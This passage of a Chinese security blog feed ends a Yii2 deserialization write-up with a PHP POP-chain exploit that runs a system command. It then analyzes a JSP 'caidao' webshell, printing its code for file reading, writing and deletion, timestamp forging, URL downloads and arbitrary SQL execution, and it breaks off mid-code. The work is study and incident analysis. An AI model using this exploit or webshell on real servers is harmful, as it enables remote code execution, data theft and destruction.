class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;keys = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;V0W&quot;</span> =&gt;<span class="keyword">array</span>(<span class="string">&quot;is&quot;</span>, <span class="string">&quot;Ca1j1&quot;</span>)</span><br><span class="line">            );  <span class="comment">//注意 ClearAll中的数组解析了两次，之后再unlink</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = <span class="keyword">new</span> Covers();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $payload = <span class="keyword">new</span> Swift_KeyCache_DiskKeyCache();</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize($payload));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Covers</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $refers;</span><br><span class="line">        <span class="keyword">protected</span> $description;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;description = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;refers = <span class="string">&quot;AnyStringisOK&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">IndexAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> $id;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;ls -al&#x27;</span>;           <span class="comment">//command</span></span><br><span class="line">            <span class="comment">// run() -&gt; call_user_func($this-&gt;checkAccess, $this-&gt;id);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">IndexAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;render&#x27;</span>] = [<span class="keyword">new</span> IndexAction, <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">            <span class="comment">//stopProcess方法里又调用了isRunning()方法: $process-&gt;isRunning()</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也是会报错，但是命令顺利执行了：</p><p><img src="http://image.v0w.top/Blog/2020-09-23-205302.png" alt="EXP4"></p><h2 id="3-3-不能利用的类"><a href="#3-3-不能利用的类" class="headerlink" title="3.3 不能利用的类"></a>3.3 不能利用的类</h2><p>以下是我在查找可利用方法时，做的一点记录，但是因为可能会一眼扫过去，漏掉了，所以仅供参考，师傅们，别因为这个丢了一个0day :)</p><p><strong>可控变量调用 非本类方法时，会调用</strong><code>__call</code><br>也就是说要满足这样的正则表达式：<code>\$this-&gt;(\w+)-&gt;(\w+)\(\)</code></p><ul><li><p><code>\Faker\Generator::__destruct</code>调用<code>seed()</code>方法（同类），<code>seed()</code>也没有可控变量。</p></li><li><p><code>\GuzzleHttp\Psr7\FnStream</code>类存在<code>__destruct()</code>函数，而且调用<code>call_user_func($this-&gt;_fn_close);</code>但是同时重写了<code>__wakeup()</code>方法：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">LogicException</span>(<span class="string">&#x27;FnStream should never be unserialized&#x27;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></li><li><p><code>\GuzzleHttp\Psr7\Stream::__destruct</code>调用的方法是本类中存在或者原生方法，不调<code>__call()</code></p></li><li><p><code>\PHP_Token_Stream::__destruct</code>未调用任何其他方法。</p></li><li><p><code>\Swift_Message::__wakeup</code>无可控变量。</p></li><li><p><code>\Swift_ByteStream_TemporaryFileByteStream::__destruct</code>调用<code>getPath()</code>但是在<code>getPath()</code>中的没有可控变量调用额外方法，不触发<code>__call()</code></p></li><li><p><code>\Swift_CharacterReaderFactory_SimpleCharacterReaderFactory::__wakeup</code>不调用<code>__call()</code></p></li><li><p><code>\Swift_Encoder_QpEncoder::__wakeup</code>没有可控变量。</p></li><li><p><code>\Swift_Mime_SimpleMimeEntity::__destruct</code>:<code>$this-&gt;cache</code>不可控</p></li></ul><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>本文从头到尾捋了一遍Yii的反序列化，从不同的视角和不同的触发点将这个漏洞深入学习了一下。复现出来了两个EXP（EXP1，EXP2，略有改动）。自己挖掘构造了在v2.0.38版本下可以继续利用POP链，并完成两个EXP的编写（EXP3，EXP4），在v2.0.38中测试，均成功RCE。</p><p>感觉PHP的反序列化，在挖掘过程中，主要是要把握触发点和利用链。整个POP链的构造过程非常有意思，另外，还学习到了一些新知识，比如<code>call_user_func</code>中的<code>callback</code>可以是数组，这个姿势之前就没注意过。</p><h1 id="0xFF-参考链接"><a href="#0xFF-参考链接" class="headerlink" title="0xFF 参考链接"></a>0xFF 参考链接</h1><ul><li><p><a href="https://mp.weixin.qq.com/s/NHBpF446yKQbRTiNQr8ztA"> 米斯特安全团队-CVE-2020-15148 Yii2反序列化RCE POP链分析</a></p></li><li><p><a href="https://mp.weixin.qq.com/s/jX0b0_690ie3xbaj7mj82Q">ChaBug-Yii2 反序列化（CVE-2020-15148）分析</a></p></li><li><p><a href="https://juejin.im/post/6874149010832097294">掘金-我是如何挖掘yii2的反序列化0day的</a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;HW期间爆出的Yii2漏洞，分别在9月19日进行复现，9月22日研究新的POC，并且尝试自己挖掘PO</summary>
      
    
    
    
    <category term="Web安全" scheme="http://v0w.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="php" scheme="http://v0w.top/tags/php/"/>
    
    <category term="反序列化" scheme="http://v0w.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>jsp webshell分析笔记</title>
    <link href="http://v0w.top/2020/09/02/jsp-webshell/"/>
    <id>http://v0w.top/2020/09/02/jsp-webshell/</id>
    <published>2020-09-01T16:00:00.000Z</published>
    <updated>2020-09-02T09:05:00.305Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今天突然接到一个任务，称客户需要分析一个webshell，于是放在手边的工作来看一看，发现这是一个jsp经典的菜刀木马。简单分析一个每个函数的功能吧。</p><h1 id="0x01-webshell文件分析"><a href="#0x01-webshell文件分析" class="headerlink" title="0x01 webshell文件分析"></a>0x01 webshell文件分析</h1><p>所传webshell为<code>webshell.jpg</code>文件，通过<code>010editor</code>发现，并未对文件进行编码和加密，只是修改了文件名。</p><p>对<code>webshell.jsp</code>代码每一个方法的分析如下：</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*&quot;</span>%&gt;      </span><br><span class="line">&lt;%!String Pwd = <span class="string">&quot;QWEasd123&quot;</span>;                     <span class="comment">//webshell密码</span></span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">EC</span><span class="params">(String s, String c)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;<span class="comment">//new String(s.getBytes(&quot;ISO-8859-1&quot;),c);&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//依照给定的参数s连接数据库</span></span><br><span class="line">    <span class="function">Connection <span class="title">GC</span><span class="params">(String s)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String[] x = s.trim().split(<span class="string">&quot;\r\n&quot;</span>);                    <span class="comment">//以回车符\r\n作为分割</span></span><br><span class="line">        Class.forName(x[<span class="number">0</span>].trim()).newInstance();               <span class="comment">//第一行是数据库驱动类名</span></span><br><span class="line">        Connection c = DriverManager.getConnection(x[<span class="number">1</span>].trim());<span class="comment">//第二行是jdbc的url</span></span><br><span class="line">        <span class="keyword">if</span> (x.length &gt; <span class="number">2</span>) &#123;                                  <span class="comment">//第三行(如果有的话)指定了具体的数据库名</span></span><br><span class="line">            c.setCatalog(x[<span class="number">2</span>].trim());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//得到系统中所有根目录下的每一个文件的名字的前两个字母，写入StringBuffer</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">AA</span><span class="params">(StringBuffer sb)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File r[] = File.listRoots();                            <span class="comment">// 获取根目录文件名</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; r.length; i++) &#123;                    </span><br><span class="line">            sb.append(r[i].toString().substring(<span class="number">0</span>, <span class="number">2</span>));    <span class="comment">// 每个文件的前两个字母，写入StringBuffer</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//得到指定路径下所有文件的 文件名、最后一次修改时间、文件大小、是否可读可写属性，写入StringBuffer</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">BB</span><span class="params">(String s, StringBuffer sb)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File oF = <span class="keyword">new</span> File(s), l[] = oF.listFiles();</span><br><span class="line">        String sT, sQ, sF = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        java.util.Date dt;</span><br><span class="line">        SimpleDateFormat fm = <span class="keyword">new</span> SimpleDateFormat(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; l.length; i++) &#123;</span><br><span class="line">            dt = <span class="keyword">new</span> java.util.Date(l[i].lastModified());       <span class="comment">//最后一次修改时间</span></span><br><span class="line">            sT = fm.format(dt);                      <span class="comment">// 修改时间按照格式yyyy-MM-dd HH:mm:ss 写入dt</span></span><br><span class="line">            sQ = l[i].canRead() ? <span class="string">&quot;R&quot;</span> : <span class="string">&quot;&quot;</span>;             <span class="comment">// 可读写R</span></span><br><span class="line">            sQ += l[i].canWrite() ? <span class="string">&quot; W&quot;</span> : <span class="string">&quot;&quot;</span>;          <span class="comment">// 可写写W</span></span><br><span class="line">            <span class="keyword">if</span> (l[i].isDirectory()) &#123;                   <span class="comment">// 判断是否为目录</span></span><br><span class="line">                sb.append(l[i].getName() + <span class="string">&quot;/\t&quot;</span> + sT + <span class="string">&quot;\t&quot;</span> + l[i].length()</span><br><span class="line">                        + <span class="string">&quot;\t&quot;</span> + sQ + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                sF += l[i].getName() + <span class="string">&quot;\t&quot;</span> + sT + <span class="string">&quot;\t&quot;</span> + l[i].length() + <span class="string">&quot;\t&quot;</span></span><br><span class="line">                        + sQ + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sb.append(sF);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//迭代删除给定路径下的所有文件和文件夹</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">EE</span><span class="params">(String s)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File f = <span class="keyword">new</span> File(s);</span><br><span class="line">        <span class="keyword">if</span> (f.isDirectory()) &#123;</span><br><span class="line">            File x[] = f.listFiles();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; x.length; k++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!x[k].delete()) &#123;</span><br><span class="line">                    EE(x[k].getPath());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        f.delete();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将指定路径的文件以流的形式写到response里面</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">FF</span><span class="params">(String s, HttpServletResponse r)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">512</span>];</span><br><span class="line">        r.reset();</span><br><span class="line">        ServletOutputStream os = r.getOutputStream();</span><br><span class="line">        BufferedInputStream is = <span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(s));</span><br><span class="line">        os.write((<span class="string">&quot;-&gt;&quot;</span> + <span class="string">&quot;|&quot;</span>).getBytes(), <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">        <span class="keyword">while</span> ((n = is.read(b, <span class="number">0</span>, <span class="number">512</span>)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            os.write(b, <span class="number">0</span>, n);</span><br><span class="line">        &#125;</span><br><span class="line">        os.write((<span class="string">&quot;|&quot;</span> + <span class="string">&quot;&lt;-&quot;</span>).getBytes(), <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">        os.close();</span><br><span class="line">        is.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">GG</span><span class="params">(String s, String d)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String h = <span class="string">&quot;0123456789ABCDEF&quot;</span>;</span><br><span class="line">        <span class="keyword">int</span> n;</span><br><span class="line">        File f = <span class="keyword">new</span> File(s);</span><br><span class="line">        f.createNewFile();</span><br><span class="line">        FileOutputStream os = <span class="keyword">new</span> FileOutputStream(f);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; d.length(); i += <span class="number">2</span>) &#123;</span><br><span class="line">            os.write((h.indexOf(d.charAt(i)) &lt;&lt; <span class="number">4</span> | h.indexOf(d</span><br><span class="line">                            .charAt(i + <span class="number">1</span>))));</span><br><span class="line">        &#125;</span><br><span class="line">        os.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将s指定的文件的内容写到d指定的文件里面。如果s指定的是一个文件夹，那么就将s目录下的所有文件拷贝到d目录下</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">HH</span><span class="params">(String s, String d)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File sf = <span class="keyword">new</span> File(s), df = <span class="keyword">new</span> File(d);</span><br><span class="line">        <span class="keyword">if</span> (sf.isDirectory()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!df.exists()) &#123;</span><br><span class="line">                df.mkdir();</span><br><span class="line">            &#125;</span><br><span class="line">            File z[] = sf.listFiles();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; z.length; j++) &#123;</span><br><span class="line">                HH(s + <span class="string">&quot;/&quot;</span> + z[j].getName(), d + <span class="string">&quot;/&quot;</span> + z[j].getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            FileInputStream is = <span class="keyword">new</span> FileInputStream(sf);</span><br><span class="line">            FileOutputStream os = <span class="keyword">new</span> FileOutputStream(df);</span><br><span class="line">            <span class="keyword">int</span> n;</span><br><span class="line">            <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">512</span>];</span><br><span class="line">            <span class="keyword">while</span> ((n = is.read(b, <span class="number">0</span>, <span class="number">512</span>)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                os.write(b, <span class="number">0</span>, n);</span><br><span class="line">            &#125;</span><br><span class="line">            is.close();</span><br><span class="line">            os.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//更改文件名</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">II</span><span class="params">(String s, String d)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File sf = <span class="keyword">new</span> File(s), df = <span class="keyword">new</span> File(d);</span><br><span class="line">        sf.renameTo(df);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建目录</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">JJ</span><span class="params">(String s)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File f = <span class="keyword">new</span> File(s);</span><br><span class="line">        f.mkdir();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//修改文件的最后修改时间这个属性</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">KK</span><span class="params">(String s, String t)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File f = <span class="keyword">new</span> File(s);</span><br><span class="line">        SimpleDateFormat fm = <span class="keyword">new</span> SimpleDateFormat(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line">        java.util.Date dt = fm.parse(t);</span><br><span class="line">        f.setLastModified(dt.getTime());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//s参数为url,将url的内容写入d参数指定的文件中</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">LL</span><span class="params">(String s, String d)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        URL u = <span class="keyword">new</span> URL(s);</span><br><span class="line">        <span class="keyword">int</span> n;</span><br><span class="line">        FileOutputStream os = <span class="keyword">new</span> FileOutputStream(d);</span><br><span class="line">        HttpURLConnection h = (HttpURLConnection) u.openConnection();</span><br><span class="line">        InputStream is = h.getInputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">512</span>];</span><br><span class="line">        <span class="keyword">while</span> ((n = is.read(b, <span class="number">0</span>, <span class="number">512</span>)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            os.write(b, <span class="number">0</span>, n);</span><br><span class="line">        &#125;</span><br><span class="line">        os.close();</span><br><span class="line">        is.close();</span><br><span class="line">        h.disconnect();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将流一行一行写入StringBuffer</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">MM</span><span class="params">(InputStream is, StringBuffer sb)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String l;</span><br><span class="line">        BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is));</span><br><span class="line">        <span class="keyword">while</span> ((l = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            sb.append(l + <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//得到所有的数据库的名称，写入StringBuffer</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">NN</span><span class="params">(String s, StringBuffer sb)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        ResultSet r = c.getMetaData().getCatalogs();</span><br><span class="line">        <span class="keyword">while</span> (r.next()) &#123;</span><br><span class="line">            sb.append(r.getString(<span class="number">1</span>) + <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        r.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取数据库所有的表，写入StringBuffer</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">OO</span><span class="params">(String s, StringBuffer sb)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        String[] t = &#123; <span class="string">&quot;TABLE&quot;</span> &#125;;</span><br><span class="line">        ResultSet r = c.getMetaData().getTables(<span class="keyword">null</span>, <span class="keyword">null</span>, <span class="string">&quot;%&quot;</span>, t);</span><br><span class="line">        <span class="keyword">while</span> (r.next()) &#123;</span><br><span class="line">            sb.append(r.getString(<span class="string">&quot;TABLE_NAME&quot;</span>) + <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        r.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//s的前三行参数同GC()方法，第四行为表名，得到该表的每一列的列名和类型，写入StringBuffer</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">PP</span><span class="params">(String s, StringBuffer sb)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String[] x = s.trim().split(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        Statement m = c.createStatement(<span class="number">1005</span>, <span class="number">1007</span>);</span><br><span class="line">        ResultSet r = m.executeQuery(<span class="string">&quot;select * from &quot;</span> + x[<span class="number">3</span>]);</span><br><span class="line">        ResultSetMetaData d = r.getMetaData();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= d.getColumnCount(); i++) &#123;</span><br><span class="line">            sb.append(d.getColumnName(i) + <span class="string">&quot; (&quot;</span> + d.getColumnTypeName(i)</span><br><span class="line">                    + <span class="string">&quot;)\t&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        r.close();</span><br><span class="line">        m.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//q为查询的sql语句，将查询的结果写入StringBuffer</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">QQ</span><span class="params">(String cs, String s, String q, StringBuffer sb)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        Statement m = c.createStatement(<span class="number">1005</span>, <span class="number">1008</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ResultSet r = m.executeQuery(q);</span><br><span class="line">            ResultSetMetaData d = r.getMetaData();</span><br><span class="line">            <span class="keyword">int</span> n = d.getColumnCount();</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">                sb.append(d.getColumnName(i) + <span class="string">&quot;\t|\t&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            <span class="keyword">while</span> (r.next()) &#123;</span><br><span class="line">                <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">                    sb.append(EC(r.getString(i), cs) + <span class="string">&quot;\t|\t&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                sb.append(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            r.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            sb.append(<span class="string">&quot;Result\t|\t\r\n&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                m.executeUpdate(q);</span><br><span class="line">                sb.append(<span class="string">&quot;Execute Successfully!\t|\t\r\n&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ee) &#123;</span><br><span class="line">                sb.append(ee.toString() + <span class="string">&quot;\t|\t\r\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        m.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;%&gt;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//以下为访问URL时带的参数</span></span><br><span class="line">    <span class="comment">//z0：编码</span></span><br><span class="line">    <span class="comment">//Pwd=QWEasd123：可以理解为功能选项,看看下面的代码就知道了</span></span><br><span class="line">    <span class="comment">//z1：普通参数</span></span><br><span class="line">    <span class="comment">//z2：普通参数</span></span><br><span class="line"></span><br><span class="line">    String cs = request.getParameter(<span class="string">&quot;z0&quot;</span>)==<span class="keyword">null</span>?<span class="string">&quot;gbk&quot;</span>: request.getParameter(<span class="string">&quot;z0&quot;</span>) + <span class="string">&quot;&quot;</span>;</span><br><span class="line">    request.setCharacterEncoding(cs);</span><br><span class="line">    response.setContentType(<span class="string">&quot;text/html;charset=&quot;</span> + cs);</span><br><span class="line">    String Z = EC(request.getParameter(Pwd) + <span class="string">&quot;&quot;</span>, cs);</span><br><span class="line">    String z1 = EC(request.getParameter(<span class="string">&quot;z1&quot;</span>) + <span class="string">&quot;&quot;</span>, cs);</span><br><span class="line">    String z2 = EC(request.getParameter(<span class="string">&quot;z2&quot;</span>) + <span class="string">&quot;&quot;</span>, cs);</span><br><span class="line">    StringBuffer sb = <span class="keyword">new</span> StringBuffer(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        sb.append(<span class="string">&quot;-&gt;&quot;</span> + <span class="string">&quot;|&quot;</span>);                  <span class="comment">//开头的 -&gt;| </span></span><br><span class="line">        <span class="keyword">if</span> (Z.equals(<span class="string">&quot;A&quot;</span>)) &#123;                    <span class="comment">// QWEasd123=A就调用AA函数</span></span><br><span class="line">            String s = <span class="keyword">new</span> File(application.getRealPath(request</span><br><span class="line">                    .getRequestURI())).getParent();</span><br><span class="line">            sb.append(s + <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (!s.substring(<span class="number">0</span>, <span class="number">1</span>).equals(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">                AA(sb);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;B&quot;</span>)) &#123;             <span class="comment">// QWEasd123=B就调用BB函数</span></span><br><span class="line">            BB(z1, sb);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;C&quot;</span>)) &#123;             <span class="comment">// QWEasd123=C就调用CC函数</span></span><br><span class="line">            String l = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            BufferedReader br = <span class="keyword">new</span> BufferedReader(</span><br><span class="line">                    <span class="keyword">new</span> InputStreamReader(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(</span><br><span class="line">                            z1))));</span><br><span class="line">            <span class="keyword">while</span> ((l = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                sb.append(l + <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            br.close();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;D&quot;</span>)) &#123;             <span class="comment">// QWEasd123=D就调用DD函数</span></span><br><span class="line">            BufferedWriter bw = <span class="keyword">new</span> BufferedWriter(</span><br><span class="line">                    <span class="keyword">new</span> OutputStreamWriter(<span class="keyword">new</span> FileOutputStream(</span><br><span class="line">                            <span class="keyword">new</span> File(z1))));</span><br><span class="line">            bw.write(z2);</span><br><span class="line">            bw.close();</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;E&quot;</span>)) &#123;</span><br><span class="line">            EE(z1);</span><br><span class="line">            sb.append(<span 